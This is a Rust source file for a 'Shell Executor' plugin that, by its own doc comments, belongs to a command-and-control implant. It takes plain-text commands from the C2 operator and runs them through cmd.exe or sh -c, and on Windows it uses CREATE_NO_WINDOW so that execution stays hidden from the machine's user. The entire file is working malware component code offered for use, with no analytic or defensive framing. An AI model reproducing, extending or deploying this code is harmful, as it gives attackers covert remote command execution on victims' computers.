//! # Shell Executor Plugin
//! 
//! Executes commands received from C2 via cmd.exe
//! 
//! ## Command Format
//! - Plain text command (e.g., "calc", "notepad", "ipconfig > C:\\result.txt")
//! 
//! ## C2 Usage
//! ```
//! shell:calc          -> Opens calculator
//! shell:notepad       -> Opens notepad  
//! shell:ipconfig      -> Runs ipconfig (hidden)
//! ```

use plugin_api::HostContext;

#[cfg(windows)]
use std::ptr;

#[cfg(windows)]
use windows_sys::Win32::Foundation::{CloseHandle, FALSE};
#[cfg(windows)]
use windows_sys::Win32::System::Threading::{
    CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION,
    CREATE_NO_WINDOW,
};

struct ShellPlugin;

impl ShellPlugin {
    fn new() -> Self {
        Self
    }

    fn opcode(&self) -> u8 {
        0x20 // Shell Executor Opcode
    }

    fn execute(&self, cmd: &[u8], _ctx: &HostContext) -> Result<(), ()> {
        // Command is plain text
        let command = match std::str::from_utf8(cmd) {
            Ok(s) => s.trim(),
            Err(_) => return Err(()),
        };

        if command.is_empty() {
            return Err(());
        }

        log::info!("[Shell] Executing: {}", command);

        #[cfg(windows)]
        {
            self.execute_windows(command)
        }

        #[cfg(not(windows))]
        {
            self.execute_unix(command)
        }
    }

    #[cfg(windows)]
    fn execute_windows(&self, command: &str) -> Result<(), ()> {
        // Format: cmd.exe /c {command}
        let cmd_line = format!("cmd.exe /c {}\0", command);
        
        unsafe {
            let mut si: STARTUPINFOA = std::mem::zeroed();
            si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
            let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

            let success = CreateProcessA(
                ptr::null(),
                cmd_line.as_ptr() as *mut u8,
                ptr::null(),
                ptr::null(),
                FALSE,
                CREATE_NO_WINDOW, // Hidden execution
                ptr::null(),
                ptr::null(),
                &si,
                &mut pi,
            );

            if success != 0 {
                log::info!("[Shell] Process created: PID {}", pi.dwProcessId);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                Ok(())
            } else {
                log::error!("[Shell] CreateProcess failed");
                Err(())
            }
        }
    }

    #[cfg(not(windows))]
    fn execute_unix(&self, command: &str) -> Result<(), ()> {
        use std::process::Command;
        
        match Command::new("sh")
            .arg("-c")
            .arg(command)
            .spawn()
        {
            Ok(child) => {
                log::info!("[Shell] Process spawned: PID {:?}", child.id());
                Ok(())
            }
            Err(e) => {
                log::error!("[Shell] Spawn failed: {}", e);
                Err(())
            }
        }
    }
}

plugin_api::declare_plugin!(ShellPlugin, "shell");
